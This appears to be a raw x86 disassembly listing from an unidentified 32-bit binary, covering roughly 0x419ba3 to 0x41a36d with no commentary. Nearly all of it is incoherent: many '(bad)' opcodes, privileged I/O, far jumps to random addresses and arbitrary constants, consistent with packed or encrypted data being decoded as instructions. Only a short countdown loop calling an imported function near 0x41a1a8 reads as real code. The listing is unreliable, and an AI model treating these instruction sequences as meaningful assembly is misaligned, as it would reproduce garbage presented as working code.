  419ba3:	adc    ah,BYTE PTR [esi-0x6e1f013a]
  419ba9:	es and al,0x49
  419bac:	bound  eax,QWORD PTR [ecx+0x43]
  419baf:	inc    edi
  419bb0:	pop    eax
  419bb1:	mov    esi,0x4ffca47a
  419bb6:	mov    eax,0xa5142d2f
  419bbb:	adc    eax,0x17b32594
  419bc0:	adc    edx,DWORD PTR [edx+0x4a9ada1e]
  419bc6:	adc    al,0x75
  419bc8:	sbb    eax,0x7b3b1ee7
  419bcd:	and    cl,bl
  419bcf:	jnp    0x419c33
  419bd1:	pop    ds
  419bd2:	call   0x4465:0xd143c201
  419bd9:	dec    esp
  419bda:	call   0xd73c6384
  419bdf:	and    al,0x43
  419be1:	inc    edx
  419be2:	aas    
  419be3:	hlt    
  419be4:	pop    esi
  419be5:	xor    DWORD PTR [edx-0x62],esi
  419be8:	jnp    0x419bf9
  419bea:	jb     0x419c55
  419bec:	or     BYTE PTR [esi+0x75aa4c42],0xe5
  419bf3:	pop    es
  419bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf5:	out    0x68,eax
  419bf7:	inc    esi
  419bf8:	adc    DWORD PTR [ecx+0x76],ebp
  419bfb:	outs   dx,BYTE PTR ds:[esi]
  419bfc:	add    ch,bl
  419bfe:	int3   
  419bff:	mov    eax,ds:0x69a1fb38
  419c04:	jmp    0xa90535d4
  419c09:	xor    al,BYTE PTR [esi+eax*4]
  419c0c:	cmp    edx,DWORD PTR [ecx-0x84963f2]
  419c12:	mov    ecx,0x7b17db2c
  419c17:	sub    al,0xae
  419c19:	cmp    ecx,ebx
  419c1b:	jnp    0x419bb0
  419c1d:	popa   
  419c1e:	and    ah,BYTE PTR [ebx]
  419c20:	mov    bh,0x13
  419c22:	shl    BYTE PTR [esp+esi*2-0x77],1
  419c26:	stos   DWORD PTR es:[edi],eax
  419c27:	adc    al,0x5
  419c29:	(bad)
  419c2d:	(bad)  
  419c2e:	ret    0x2c71
  419c31:	lods   eax,DWORD PTR ds:[esi]
  419c32:	jnp    0x419c2c
  419c34:	bound  edi,QWORD PTR [edx-0x7423735c]
  419c3a:	mov    ds:0xa2aa9894,al
  419c3f:	inc    ebp
  419c40:	mov    bl,0xf
  419c42:	cli    
  419c43:	retf   
  419c44:	or     ah,BYTE PTR [ecx+ebp*1+0x5268d466]
  419c4b:	or     ch,dh
  419c4d:	jg     0x419c35
  419c4f:	ss mov al,0x99
  419c52:	shl    DWORD PTR [edi+0x6e],1
  419c55:	mov    esi,esp
  419c57:	daa    
  419c58:	push   ebp
  419c59:	adc    dl,BYTE PTR [ecx]
  419c5b:	jae    0x419c61
  419c5d:	fcomp  QWORD PTR [eax+edx*1]
  419c60:	lods   eax,DWORD PTR ds:[esi]
  419c61:	jno    0x419c8d
  419c63:	push   ebx
  419c64:	ret    0xf0b6
  419c67:	and    BYTE PTR [edx+edi*2],0xc2
  419c6b:	es ror ch,0xfc
  419c6f:	int    0x7c
  419c71:	stc    
  419c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c73:	test   al,0xb4
  419c75:	stos   BYTE PTR es:[edi],al
  419c76:	mov    al,0xe0
  419c78:	pop    edi
  419c79:	sar    DWORD PTR [esi],1
  419c7b:	mov    WORD PTR [eax],?
  419c7d:	das    
  419c7e:	test   DWORD PTR [edi],esp
  419c80:	lods   al,BYTE PTR ds:[esi]
  419c81:	xchg   edi,eax
  419c82:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  419c89:	and    edx,0x36c8
  419c8f:	jmp    0x41a1a1
  419c94:	retf   
  419c95:	leave  
  419c96:	int    0xcb
  419c98:	int    0xdb
  419c9a:	fxch   st(1)
  419c9c:	sub    eax,0x3205fe08
  419ca1:	loopne 0x419c61
  419ca3:	scas   al,BYTE PTR es:[edi]
  419ca4:	jns    0x419c9b
  419ca6:	jg     0x419d20
  419ca8:	jae    0x419d26
  419caa:	js     0x419d24
  419cac:	(bad)  
  419cae:	dec    ebp
  419caf:	jne    0x419c7a
  419cb1:	or     BYTE PTR [esp+eax*4+0x10],dl
  419cb5:	inc    esi
  419cb6:	fisttp WORD PTR ds:[eax-0x4a]
  419cba:	add    BYTE PTR [esi+eiz*1-0x26],dl
  419cbe:	mov    esi,0xcc4a4f17
  419cc3:	inc    edx
  419cc4:	push   cs
  419cc5:	mov    DWORD PTR [eax],edx
  419cc7:	cmp    esp,DWORD PTR [ebp+0x4b406133]
  419ccd:	add    eax,0x73dd3ba7
  419cd2:	pop    es
  419cd3:	mov    edi,0x153e0d8a
  419cd8:	ror    BYTE PTR [eax+0x75],0x86
  419cdc:	ret    0x7e57
  419cdf:	mov    ch,bh
  419ce1:	jbe    0x419d03
  419ce3:	in     al,dx
  419ce4:	cmp    eax,0x7d959955
  419ce9:	push   0xedc53c78
  419cee:	jecxz  0x419ce9
  419cf0:	addr16 jmp 0x9a24:0xf6667253
  419cf8:	iret   
  419cf9:	gs jae 0x419d29
  419cfc:	xchg   esi,eax
  419cfd:	retf   
  419cfe:	push   edx
  419cff:	and    esp,esp
  419d01:	cmp    BYTE PTR [edx],dl
  419d03:	push   es
  419d04:	(bad)  
  419d05:	stc    
  419d06:	sbb    eax,0x439c48a0
  419d0b:	pop    es
  419d0c:	dec    ecx
  419d0d:	pop    ebx
  419d0e:	es mov dh,0x29
  419d11:	loope  0x419d39
  419d13:	(bad)  [ebx]
  419d15:	cmp    DWORD PTR [eax],ebp
  419d17:	ja     0x419d68
  419d19:	out    0x36,eax
  419d1b:	fnstcw WORD PTR [ebx+0x18]
  419d1e:	stc    
  419d1f:	cdq    
  419d20:	jno    0x419cb7
  419d22:	inc    edi
  419d23:	loopne 0x419ca6
  419d25:	jp     0x419d2e
  419d27:	cdq    
  419d28:	jge    0x419d8f
  419d2a:	sbb    eax,0xd217e4e8
  419d2f:	clc    
  419d30:	int    0xa4
  419d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d33:	outs   dx,DWORD PTR ds:[esi]
  419d34:	(bad)  
  419d35:	jl     0x419d25
  419d37:	test   DWORD PTR [ebp+0x7730b712],ebp
  419d3d:	(bad)  
  419d3e:	test   eax,0xb5043f00
  419d43:	fimul  DWORD PTR [eax]
  419d45:	dec    ecx
  419d46:	pop    ebp
  419d47:	xor    DWORD PTR [esi+0x3bfa43ca],edx
  419d4d:	jge    0x419d9b
  419d4f:	shr    esi,1
  419d51:	jnp    0x419da7
  419d53:	lock cmp DWORD PTR [edi-0x2ff2116],ebp
  419d5a:	lds    edx,FWORD PTR [ebp-0x69]
  419d5d:	mov    DWORD PTR [esi],ecx
  419d5f:	sahf   
  419d60:	jp     0x419d08
  419d62:	fdivr  st,st(5)
  419d64:	pushf  
  419d65:	pop    esp
  419d66:	pop    eax
  419d67:	mov    ebx,0x1bd1f496
  419d6c:	popf   
  419d6d:	and    DWORD PTR [edx+0x36],esp
  419d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d71:	jno    0x419d1d
  419d73:	xchg   DWORD PTR [eax*8-0x6bff439],ebp
  419d7a:	mov    BYTE PTR [ecx+0x8c5a8d2],dl
  419d80:	in     al,0x33
  419d82:	xor    al,0xfd
  419d85:	sub    esp,edi
  419d87:	sahf   
  419d88:	loop   0x419dd9
  419d8a:	fisubr DWORD PTR [edi]
  419d8c:	stos   BYTE PTR es:[edi],al
  419d8d:	dec    esp
  419d8e:	std    
  419d8f:	inc    esp
  419d90:	and    BYTE PTR [edi-0x6a],ch
  419d93:	nop
  419d94:	in     al,0x39
  419d96:	sahf   
  419d97:	xor    dh,BYTE PTR [esi]
  419d99:	dec    edi
  419d9a:	jbe    0x419d89
  419d9c:	jg     0x419db0
  419d9e:	nop
  419d9f:	shl    DWORD PTR ds:0xf0ae6011,cl
  419da5:	cmp    esi,0x6a
  419da8:	pop    ss
  419da9:	add    ch,ah
  419dab:	shl    BYTE PTR [ebp+eax*4-0x2b],1
  419daf:	fisub  DWORD PTR [edx+edx*4-0x36]
  419db3:	push   edi
  419db4:	adc    eax,edi
  419db6:	adc    DWORD PTR ds:0x7eb866aa,ebp
  419dbc:	dec    edx
  419dbd:	test   al,0x99
  419dbf:	out    0xe6,al
  419dc1:	daa    
  419dc2:	add    eax,0x9e5ab717
  419dc7:	cmp    al,BYTE PTR [ebx]
  419dc9:	ds xchg ebx,eax
  419dcb:	jno    0x419db2
  419dcd:	sbb    eax,0x4cca141b
  419dd2:	pushf  
  419dd3:	xchg   esi,eax
  419dd4:	xchg   edi,eax
  419dd5:	(bad)  
  419dd6:	ret    0xdc59
  419dd9:	sub    eax,0x5a557703
  419dde:	mov    eax,ds:0x2cfa03e8
  419de3:	les    edi,FWORD PTR [edx+0x7d]
  419de6:	inc    ecx
  419de7:	cmp    ebx,DWORD PTR [eax]
  419de9:	adc    eax,0xaf122f16
  419dee:	dec    eax
  419def:	push   edi
  419df0:	mov    dl,0xf5
  419df2:	aam    0xee
  419df4:	int3   
  419df5:	aaa    
  419df6:	sbb    DWORD PTR [ebx+0x635f0a63],0x18
  419dfd:	inc    edi
  419dfe:	add    BYTE PTR [edi+esi*4-0x101e38af],dh
  419e05:	mov    eax,0xf3cbe29d
  419e0a:	std    
  419e0b:	xchg   esi,eax
  419e0c:	pop    esp
  419e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e0e:	inc    eax
  419e0f:	xchg   edx,eax
  419e10:	cmp    ebp,DWORD PTR [esi-0x543a57a0]
  419e16:	sbb    eax,0x7dfd7094
  419e1b:	ss and al,0xca
  419e1e:	dec    esp
  419e1f:	test   BYTE PTR [edx+0x144c39ec],al
  419e25:	mov    ecx,0x2ce6ab55
  419e2a:	xchg   esi,eax
  419e2b:	fst    DWORD PTR [ebx]
  419e2d:	inc    edi
  419e2e:	into   
  419e2f:	mov    dh,BYTE PTR [edi-0x2f45b60e]
  419e35:	es pop ebx
  419e37:	pop    eax
  419e38:	push   esi
  419e39:	pop    eax
  419e3a:	addr16 pop edi
  419e3c:	in     eax,0x4e
  419e3e:	xor    BYTE PTR [ecx+0x39],0x46
  419e42:	es clc 
  419e44:	fidivr WORD PTR [edi+0x17e9d423]
  419e4a:	mov    cl,0x2f
  419e4c:	mov    WORD PTR [eax+0x2f],gs
  419e4f:	in     al,dx
  419e50:	or     eax,0xf6c4e7
  419e55:	aam    0x10
  419e57:	cmp    al,0xa
  419e59:	sbb    eax,DWORD PTR [esi]
  419e5b:	jg     0x419de7
  419e5d:	or     eax,0xbb0224a7
  419e62:	aad    0xc3
  419e64:	sahf   
  419e65:	test   eax,0xcab9f2d4
  419e6a:	dec    edx
  419e6b:	repnz test BYTE PTR [eax+0x16],0x3a
  419e70:	mov    ebx,0x77743110
  419e75:	dec    edi
  419e76:	or     ch,dh
  419e78:	jg     0x419e1b
  419e7a:	jp     0x419e23
  419e7c:	xor    BYTE PTR [edi+0x40f4f040],bl
  419e82:	mov    dh,0xc1
  419e84:	mov    dh,0xae
  419e86:	mov    eax,ds:0x56733a6d
  419e8b:	jl     0x419e87
  419e8d:	inc    edx
  419e8e:	stc    
  419e8f:	jmp    0x419ee6
  419e91:	fwait
  419e92:	cli    
  419e93:	stos   DWORD PTR es:[edi],eax
  419e94:	sub    al,0xa6
  419e96:	fs pop ss
  419e98:	jno    0x419e7d
  419e9a:	icebp  
  419e9b:	retf   
  419e9c:	(bad)  
  419e9d:	jbe    0x419eb9
  419e9f:	sti    
  419ea0:	fwait
  419ea1:	sahf   
  419ea2:	cmc    
  419ea3:	xor    esp,ebx
  419ea5:	rol    DWORD PTR [ecx-0x80],0x71
  419ea9:	(bad)  
  419eaa:	repz mov esp,0x8a8d2001
  419eb0:	mov    ah,0xb7
  419eb2:	mov    ah,0x21
  419eb4:	(bad)  
  419eb5:	xchg   ecx,eax
  419eb6:	and    DWORD PTR [ebx+0x21fb1b6f],ecx
  419ebc:	push   ds
  419ebd:	ror    DWORD PTR [ecx+0x45],0xec
  419ec1:	lock inc ebx
  419ec3:	push   ss
  419ec4:	shl    DWORD PTR [eax],cl
  419ec6:	dec    esp
  419ec7:	and    DWORD PTR [edi-0x5f1ec293],esi
  419ecd:	pop    ecx
  419ece:	add    DWORD PTR [edi-0x1074c59a],edi
  419ed4:	sbb    DWORD PTR ds:0x7c2700d1,0xffffffd0
  419edb:	retf   
  419edc:	in     al,0xd9
  419ede:	outs   dx,DWORD PTR ds:[esi]
  419edf:	cmp    ch,bl
  419ee1:	retf   0x23d6
  419ee4:	stos   BYTE PTR es:[edi],al
  419ee5:	je     0x419f1d
  419ee7:	xchg   esp,esi
  419ee9:	xor    dh,BYTE PTR [eax-0x56b2a0e6]
  419eef:	cmc    
  419ef0:	js     0x419f6c
  419ef2:	ret    
  419ef3:	inc    edi
  419ef4:	jg     0x419f70
  419ef6:	les    ebp,FWORD PTR [ecx]
  419ef8:	fldenv [esi+0x61]
  419efc:	push   0xffffffd4
  419efe:	inc    esp
  419eff:	std    
  419f00:	ficom  DWORD PTR ds:0x3d157a73
  419f06:	cmp    ebx,DWORD PTR [ebp+0x50]
  419f09:	adc    edi,DWORD PTR [esi]
  419f0b:	dec    ecx
  419f0c:	jge    0x419eb4
  419f0e:	mov    esp,0x4d6392be
  419f13:	inc    sp
  419f15:	pop    ds
  419f16:	add    DWORD PTR [eax],esi
  419f18:	loopne 0x419f0f
  419f1a:	sbb    ah,dl
  419f1c:	or     eax,0x8314f957
  419f21:	mov    ebx,0x38c7d3ce
  419f26:	adc    al,0x69
  419f28:	fiadd  DWORD PTR [ecx-0x2d]
  419f2b:	shr    BYTE PTR [esi],1
  419f2d:	jmp    0xf853:0x45cac4d2
  419f34:	mov    bh,0x0
  419f36:	(bad)  
  419f37:	add    eax,DWORD PTR [edi+ebp*8]
  419f3a:	mov    ebp,0x213d9eac
  419f3f:	js     0x419ef5
  419f41:	loop   0x419f5e
  419f43:	fisubr DWORD PTR [ecx+edx*8-0x7c]
  419f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f48:	out    dx,eax
  419f49:	cwde   
  419f4a:	lock mov al,ds:0x7cd6b700
  419f50:	and    BYTE PTR [ebp-0x24],ch
  419f53:	adc    BYTE PTR [eax+eax*1+0x3a07d1a2],dh
  419f5a:	rcr    BYTE PTR [ebp+0x4d],cl
  419f5d:	mov    eax,0xe684f3cc
  419f62:	push   ecx
  419f63:	aad    0xa1
  419f65:	sar    DWORD PTR [edx],1
  419f67:	imul   ebx,DWORD PTR [ebp+0x5c2da3a],0xffffffab
  419f6e:	xor    DWORD PTR [edi+0x65],ebp
  419f71:	jmp    0xb7076fd2
  419f76:	and    esi,0x3026bfc9
  419f7c:	in     al,dx
  419f7d:	leave  
  419f7e:	shl    BYTE PTR [edi-0x6],1
  419f81:	out    0x2a,eax
  419f83:	jl     0x419f1d
  419f85:	add    esi,eax
  419f87:	xor    cl,BYTE PTR ds:0x6a73ba56
  419f8d:	xor    BYTE PTR [ecx-0x4a282b52],cl
  419f93:	cld    
  419f94:	js     0x419f47
  419f96:	in     al,0x6c
  419f98:	js     0x419fd2
  419f9a:	inc    eax
  419f9b:	(bad)  
  419f9c:	or     ecx,DWORD PTR [esi-0x45]
  419f9f:	leave  
  419fa0:	push   esi
  419fa1:	(bad)  
  419fa3:	cmp    eax,eax
  419fa5:	sub    eax,0x94f4d0a6
  419faa:	cli    
  419fab:	push   cs
  419fac:	in     al,0x8b
  419fae:	es stc 
  419fb0:	loop   0x419fb2
  419fb2:	aaa    
  419fb3:	test   dl,0x30
  419fb6:	inc    ebx
  419fb7:	xchg   ebx,eax
  419fb8:	xchg   ebp,eax
  419fb9:	fidivr DWORD PTR [ecx]
  419fbb:	adc    bh,BYTE PTR [ecx+0x13b432b3]
  419fc1:	jb     0x419f69
  419fc3:	outs   dx,DWORD PTR ds:[esi]
  419fc4:	jbe    0x419fa2
  419fc6:	mov    eax,ds:0x79eeef7f
  419fcb:	cmp    al,0xef
  419fcd:	push   edi
  419fce:	sbb    BYTE PTR [ebp+0x6b],dh
  419fd1:	mov    al,0x5e
  419fd3:	jo     0x419fc3
  419fd5:	sub    eax,0xbaaaeb0c
  419fda:	xor    BYTE PTR [eax-0x36],bh
  419fdd:	push   cs
  419fde:	hlt    
  419fdf:	mov    al,0x54
  419fe1:	push   ds
  419fe2:	push   edx
  419fe3:	push   esp
  419fe4:	(bad)  
  419fe5:	and    DWORD PTR [ebp+0x7ebb5943],ebp
  419feb:	xchg   edi,eax
  419fec:	loope  0x41a053
  419fee:	dec    edi
  419fef:	inc    ebx
  419ff0:	ds push 0xbe5545e1
  419ff6:	scas   eax,DWORD PTR es:[edi]
  419ff7:	inc    ebx
  419ff8:	pop    ss
  419ff9:	and    bl,BYTE PTR [eax]
  419ffb:	jle    0x41a025
  419ffd:	das    
  419ffe:	xor    al,BYTE PTR [esi+0x26e8479f]
  41a004:	sbb    BYTE PTR [edx-0x69],ch
  41a007:	lea    ecx,[edx+0x39e7a353]
  41a00d:	fdivr  QWORD PTR [eax]
  41a00f:	inc    ecx
  41a010:	mov    al,ds:0xa124f09b
  41a015:	dec    edx
  41a016:	and    DWORD PTR [edx+0x4de54b45],ebx
  41a01c:	mov    dh,0xcd
  41a01e:	push   ebp
  41a01f:	dec    ecx
  41a020:	ins    DWORD PTR es:[edi],dx
  41a021:	inc    esi
  41a022:	sub    eax,0xa8060075
  41a027:	xchg   ebp,eax
  41a028:	cmp    eax,0xa5cb5524
  41a02d:	xchg   esp,eax
  41a02e:	call   0x3fcc3e83
  41a033:	add    bl,BYTE PTR [eax+edi*4+0x15adaef8]
  41a03a:	je     0x41a054
  41a03c:	push   ds
  41a03d:	hlt    
  41a03e:	push   0xed8a62f8
  41a043:	push   0xe
  41a045:	sub    DWORD PTR [edi+0x6678f931],edx
  41a04b:	or     ecx,DWORD PTR [ebp-0x6e3739ce]
  41a051:	adc    dl,BYTE PTR [ebx-0x21]
  41a054:	add    BYTE PTR [edi],bl
  41a056:	js     0x41a0be
  41a058:	mov    eax,0xd69ec27
  41a05d:	icebp  
  41a05e:	cs mov ecx,0x2ad37ba7
  41a064:	adc    eax,0x9042c5f2
  41a069:	js     0x41a042
  41a06b:	push   ds
  41a06c:	lods   al,BYTE PTR ds:[esi]
  41a06d:	push   ss
  41a06e:	iret   
  41a06f:	adc    ah,BYTE PTR [edi]
  41a071:	hlt    
  41a072:	sub    al,0x36
  41a074:	les    ebx,FWORD PTR [eax]
  41a076:	(bad)  
  41a077:	cdq    
  41a078:	outs   dx,DWORD PTR ds:[esi]
  41a079:	enter  0xd008,0x3b
  41a07d:	ins    DWORD PTR es:[edi],dx
  41a07e:	inc    BYTE PTR [esi]
  41a080:	std    
  41a081:	out    dx,eax
  41a082:	in     al,0x9a
  41a084:	dec    eax
  41a085:	stc    
  41a086:	test   al,0x31
  41a088:	push   ds
  41a089:	fwait
  41a08a:	xchg   esi,eax
  41a08b:	add    DWORD PTR [edx+ebx*8-0x3ef6862d],edi
  41a092:	test   ecx,esi
  41a094:	xor    dl,BYTE PTR [edx+eiz*4]
  41a097:	pop    edx
  41a098:	shl    ebp,1
  41a09a:	jns    0x41a0d2
  41a09c:	jl     0x41a035
  41a09e:	(bad)  
  41a09f:	mov    eax,ds:0x8fa1daa8
  41a0a4:	sbb    DWORD PTR [ecx+0x36],ecx
  41a0a7:	jbe    0x41a090
  41a0a9:	popf   
  41a0aa:	jp     0x41a118
  41a0ac:	cmp    eax,0x2daf4895
  41a0b1:	dec    DWORD PTR [edi]
  41a0b3:	inc    esi
  41a0b4:	and    al,0xad
  41a0b6:	clc    
  41a0b7:	imul   edi,DWORD PTR [ebx+0x72],0xbef15cb
  41a0be:	bound  edi,QWORD PTR [ebp+0x7333dc76]
  41a0c4:	aas    
  41a0c5:	das    
  41a0c6:	pop    edi
  41a0c7:	mov    WORD PTR ds:0x369f40e5,gs
  41a0cd:	ret    0x64a4
  41a0d0:	into   
  41a0d1:	jae    0x41a0bb
  41a0d3:	test   DWORD PTR [eax+esi*8+0x29],ebp
  41a0d7:	jmp    0x41a139
  41a0d9:	mov    dl,0xf
  41a0db:	jecxz  0x41a0d8
  41a0dd:	pop    ebx
  41a0de:	jnp    0x41a0c1
  41a0e0:	xor    DWORD PTR [esi-0x3dfa1f82],ecx
  41a0e6:	aam    0xc5
  41a0e8:	jb     0x41a0f6
  41a0ea:	adc    eax,0x37ef9b01
  41a0ef:	ds pop ds
  41a0f1:	xchg   ebx,eax
  41a0f2:	es into 
  41a0f4:	shufps xmm5,XMMWORD PTR [edi+esi*2+0x75],0xd6
  41a0fa:	not    BYTE PTR ds:0x876683c7
  41a100:	adc    al,0xdc
  41a102:	push   ss
  41a103:	dec    esp
  41a104:	mov    WORD PTR [esi+0x6cfccffe],?
  41a10a:	add    ah,ch
  41a10c:	xor    BYTE PTR [edi],cl
  41a10e:	pop    ebx
  41a10f:	cmp    eax,0x61774da3
  41a114:	pop    esp
  41a115:	cmp    si,WORD PTR [edx+0x5f]
  41a119:	(bad)  
  41a11a:	pop    ebp
  41a11b:	in     al,dx
  41a11c:	and    ebp,edx
  41a11e:	fild   QWORD PTR [ebx+0x18]
  41a121:	fwait
  41a122:	mov    eax,ds:0x513f0827
  41a127:	cmc    
  41a128:	rcl    ch,cl
  41a12a:	jae    0x41a0c1
  41a12c:	dec    eax
  41a12d:	inc    ebx
  41a12e:	out    0x88,al
  41a130:	inc    esi
  41a131:	mov    ebp,DWORD PTR ds:[ebx+edx*4+0x508c16ff]
  41a139:	aaa    
  41a13a:	cwde   
  41a13b:	mov    esp,0x16e0e553
  41a140:	add    DWORD PTR [ebx+0x4e],ebx
  41a143:	jo     0x41a157
  41a145:	push   esp
  41a146:	dec    esi
  41a147:	sbb    dl,BYTE PTR [ecx+0x5f]
  41a14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a14b:	leave  
  41a14c:	push   ds
  41a14d:	or     BYTE PTR [eax+0x72a7c283],0x99
  41a154:	mov    eax,ds:0x74d74bfc
  41a159:	scas   eax,DWORD PTR es:[edi]
  41a15a:	sub    eax,DWORD PTR [edx+ebx*1+0x76]
  41a15e:	push   ss
  41a15f:	mov    al,ds:0x9d9a0abb
  41a164:	mov    ds:0x2bf264b9,al
  41a169:	outs   dx,DWORD PTR ds:[esi]
  41a16a:	cmove  edi,DWORD PTR [edx]
  41a16d:	inc    edx
  41a16e:	fxch   st(5)
  41a170:	mov    ds:0x78c1baea,eax
  41a175:	mov    al,BYTE PTR [edx+0x3f8fda44]
  41a17b:	dec    ebx
  41a17c:	fistp  QWORD PTR [esi-0x429a25f2]
  41a182:	and    ecx,eax
  41a184:	nop
  41a185:	inc    ebp
  41a186:	mov    ch,0x23
  41a188:	cbw    
  41a18a:	enter  0xf70a,0x6d
  41a18e:	mov    eax,0x1dbf64fe
  41a193:	adc    DWORD PTR [eax],ebp
  41a195:	sbb    al,0x8c
  41a197:	js     0x41a123
  41a199:	icebp  
  41a19a:	pop    ebx
  41a19b:	lock fucomi st,st(0)
  41a19e:	scas   al,BYTE PTR es:[edi]
  41a19f:	stc    
  41a1a0:	fcmovnb st,st(7)
  41a1a2:	inc    ebp
  41a1a3:	enter  0x853e,0x9c
  41a1a7:	clc    
  41a1a8:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  41a1af:	mov    edx,DWORD PTR [ebp+0x8]
  41a1b2:	mov    DWORD PTR ds:0x42a37d,0x17
  41a1bc:	cmp    DWORD PTR ds:0x42a37d,0x0
  41a1c3:	je     0x41a70a
  41a1c9:	cmp    DWORD PTR ds:0x42a37d,0x20
  41a1d0:	jne    0x41a1e6
  41a1d6:	push   0x8ff4
  41a1db:	push   0x7f63
  41a1e0:	call   DWORD PTR ds:0x425024
  41a1e6:	mov    edi,DWORD PTR ds:0x42a37d
  41a1ec:	dec    edi
  41a1ed:	mov    DWORD PTR ds:0x42a37d,edi
  41a1f3:	jmp    0x41a1bc
  41a1f8:	jmp    0x41a70a
  41a1fd:	(bad)  
  41a1fe:	iret   
  41a1ff:	cmp    eax,0xdad1d5d3
  41a204:	fld    st(7)
  41a206:	outs   dx,DWORD PTR ds:[esi]
  41a207:	fisubr WORD PTR [edi+0x7af2c847]
  41a20d:	ins    BYTE PTR es:[edi],dx
  41a20e:	clc    
  41a20f:	jg     0x41a289
  41a211:	jae    0x41a28f
  41a213:	js     0x41a28d
  41a215:	fdiv   st(4),st
  41a217:	hlt    
  41a218:	cmp    edi,esp
  41a21a:	adc    BYTE PTR [edi],ah
  41a21c:	pop    ecx
  41a21d:	xor    al,0xbb
  41a21f:	sbb    al,0x52
  41a221:	(bad)  
  41a222:	jmp    0x2370f54d
  41a227:	aad    0xdb
  41a229:	mov    eax,ds:0xcadc728
  41a22e:	sbb    edi,DWORD PTR [edx-0x140ccf75]
  41a234:	or     DWORD PTR [esi],esp
  41a236:	jae    0x41a214
  41a238:	jnp    0x41a1d8
  41a23a:	je     0x41a226
  41a23c:	jne    0x41a288
  41a23e:	jo     0x41a228
  41a240:	addr16 mov eax,ds:0x738d
  41a244:	mov    ch,0xf0
  41a246:	and    BYTE PTR [esi+ebx*4],ah
  41a249:	test   eax,0x9d7de0c5
  41a24e:	mov    esp,0xa2983ad
  41a253:	pop    edx
  41a254:	fcom   DWORD PTR [ebx]
  41a256:	jle    0x41a288
  41a258:	dec    ebx
  41a259:	jnp    0x41a252
  41a25b:	push   ss
  41a25c:	int3   
  41a25d:	stc    
  41a25e:	(bad)
  41a261:	nop
  41a262:	enter  0x3e54,0xb6
  41a266:	dec    ecx
  41a267:	ret    0x9ff4
  41a26a:	outs   dx,BYTE PTR gs:[esi]
  41a26c:	mov    WORD PTR [edi],?
  41a26e:	loope  0x41a23f
  41a270:	inc    di
  41a272:	arpl   WORD PTR [edi+0x4],dx
  41a275:	fcmovnbe st,st(5)
  41a277:	fwait
  41a278:	jp     0x41a21d
  41a27a:	hlt    
  41a27b:	jmp    0x794d:0x3b99008a
  41a282:	je     0x41a238
  41a284:	fs and ebp,esi
  41a287:	add    dh,BYTE PTR [eax]
  41a289:	scas   al,BYTE PTR es:[edi]
  41a28a:	cld    
  41a28b:	shl    BYTE PTR [eax+0x30c66f76],0x6f
  41a292:	cmp    DWORD PTR [eax-0x9],ebx
  41a295:	repz loope 0x41a2e9
  41a298:	sbb    esp,DWORD PTR [edi+0x47]
  41a29b:	int3   
  41a29c:	mov    edi,0xa7a82996
  41a2a1:	aad    0xe2
  41a2a3:	aas    
  41a2a4:	and    al,0xe2
  41a2a6:	cmp    eax,0xd2f7a695
  41a2ab:	in     eax,dx
  41a2ac:	lahf   
  41a2ad:	cdq    
  41a2ae:	enter  0x19a0,0xe4
  41a2b2:	cmp    eax,0x842c0a45
  41a2b7:	fdiv   DWORD PTR [eax+edx*1]
  41a2ba:	int    0xf3
  41a2bc:	sbb    BYTE PTR [ecx+0x25],bh
  41a2bf:	int    0xb
  41a2c1:	daa    
  41a2c2:	in     al,dx
  41a2c3:	out    dx,eax
  41a2c4:	inc    ecx
  41a2c5:	(bad)  
  41a2c6:	and    edi,DWORD PTR [ebx+0x1b8916b0]
  41a2cc:	aas    
  41a2cd:	(bad)  
  41a2cf:	push   cs
  41a2d0:	lahf   
  41a2d1:	mov    ebp,0xd423fa7b
  41a2d6:	retf   
  41a2d7:	stos   DWORD PTR es:[edi],eax
  41a2d8:	pop    edi
  41a2d9:	not    ch
  41a2db:	add    ah,BYTE PTR [esi]
  41a2dd:	stos   DWORD PTR es:[edi],eax
  41a2de:	addr16 shl ebx,cl
  41a2e1:	and    eax,0xfe2e9806
  41a2e6:	in     al,dx
  41a2e7:	pop    es
  41a2e8:	outs   dx,DWORD PTR ds:[esi]
  41a2e9:	lods   al,BYTE PTR ds:[esi]
  41a2ea:	fdiv   DWORD PTR [esi+0x2e]
  41a2ed:	xor    DWORD PTR [ebp-0x410d45ca],ecx
  41a2f3:	sub    al,0x9f
  41a2f5:	sbb    esi,DWORD PTR [edi-0x15]
  41a2f8:	mov    ebp,0xd3189c33
  41a2fd:	arpl   WORD PTR ds:0x90881d1a,si
  41a303:	adc    DWORD PTR [esi+eiz*8],0x41
  41a307:	add    eax,DWORD PTR [ebp-0x80]
  41a30a:	sbb    bl,BYTE PTR [eax]
  41a30c:	enter  0x578a,0x1d
  41a310:	scas   eax,DWORD PTR es:[edi]
  41a311:	mov    esp,0x98d034bc
  41a316:	rol    DWORD PTR [esi-0x554d0e8a],0x6c
  41a31d:	lods   eax,DWORD PTR ds:[esi]
  41a31e:	pop    ebp
  41a31f:	jl     0x41a2e4
  41a321:	cmp    ecx,DWORD PTR [eax-0x71]
  41a324:	mov    esi,0xa6a79da6
  41a329:	jne    0x41a34c
  41a32b:	mov    al,0x58
  41a32d:	fadd   QWORD PTR ds:0x4a41195c
  41a333:	ret    0x2189
  41a336:	fld    st(0)
  41a338:	pop    ecx
  41a339:	int    0x1b
  41a33b:	sbb    ebx,eax
  41a33d:	into   
  41a33e:	push   edi
  41a33f:	repnz shl BYTE PTR [ebp-0x26],0xae
  41a344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a345:	test   DWORD PTR [ebp+0x6f76510e],esi
  41a34b:	popa   
  41a34c:	popf   
  41a34d:	(bad)  
  41a34e:	jmp    0x3758a28e
  41a353:	add    ecx,DWORD PTR [ebx]
  41a355:	jae    0x41a35c
  41a357:	push   ds
  41a358:	data16 repnz test al,0xcf
  41a35c:	sbb    esp,0x2d
  41a35f:	add    eax,0x1cead6c
  41a364:	push   ebp
  41a365:	inc    edi
  41a366:	jo     0x41a2f5
  41a368:	repnz aad 0x64
  41a36b:	loopne 0x41a37a
  41a36d:	xor    DWORD PTR [eax],ecx
